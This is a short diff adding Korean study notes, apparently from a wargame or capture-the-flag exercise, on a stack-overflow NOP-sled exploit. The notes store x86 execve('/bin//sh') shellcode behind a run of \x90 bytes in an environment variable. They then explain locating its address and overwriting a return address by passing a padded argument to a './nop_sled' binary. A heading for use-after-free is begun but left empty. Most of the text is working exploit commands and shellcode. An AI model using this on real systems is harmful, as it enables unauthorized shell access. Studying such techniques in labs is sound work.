@@ -1,0 +1,12 @@
+# nop
+쉘코드를 환경변수로 등록한다  
+export SHELLCODE=`python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'"`
+
+환경변수의 주소를 확인한다.
+env -> 주변주소 찾아서 909090인 부분중 하나를 가져온다.
+
+주소:'\x9d\xdf\xff\xff'  
+./nop_sled `python -c "print '\x90' * 68 + '\x9d\xdf\xff\xff'"`  
+명령줄 인자로 값을 전달한다.
+
+# uaf
